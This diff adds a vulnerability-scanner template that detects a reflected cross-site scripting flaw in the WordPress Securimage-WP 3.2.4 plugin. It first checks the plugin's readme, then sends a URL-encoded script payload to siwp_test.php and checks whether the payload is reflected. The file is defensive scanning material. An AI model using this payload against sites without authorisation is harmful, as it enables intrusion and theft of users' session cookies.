@@ -1,0 +1,54 @@
+id: wp-securimage-xss
+
+info:
+  name: WordPress Securimage-WP 3.2.4 - Cross-Site Scripting
+  author: daffainfo
+  severity: high
+  description: WordPress Securimage-WP 3.2.4 plugin contains a cross-site scripting vulnerability via siwp_test.php. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+  reference:
+    - https://www.exploit-db.com/exploits/38510
+    - http://web.archive.org/web/20210123054214/https://www.securityfocus.com/bid/59816/info
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-79
+  metadata:
+    max-request: 2
+  tags: edb,wordpress,xss,wp-plugin,vuln
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /wp-content/plugins/securimage-wp/readme.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        internal: true
+        words:
+          - 'Securimage-WP'
+          - 'Tags:'
+        condition: and
+
+  - method: GET
+    path:
+      - '{{BaseURL}}/wp-content/plugins/securimage-wp/siwp_test.php/%22/%3E%3Cscript%3Ealert(1);%3C/script%3E?tested=1'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<script>alert(1)</script>"
+        part: body
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
+# digest: 4b0a00483046022100b19e65c5a18f73c3b2bf5b241ed59f461dcc4211b581b63db91027959c203ac6022100e6c6f7c5b739053bcdc9e1e390f4a5494e8afdc84c9f48c4e863f212610e6c5e:922c64590222798bb761d5b6d8e72950
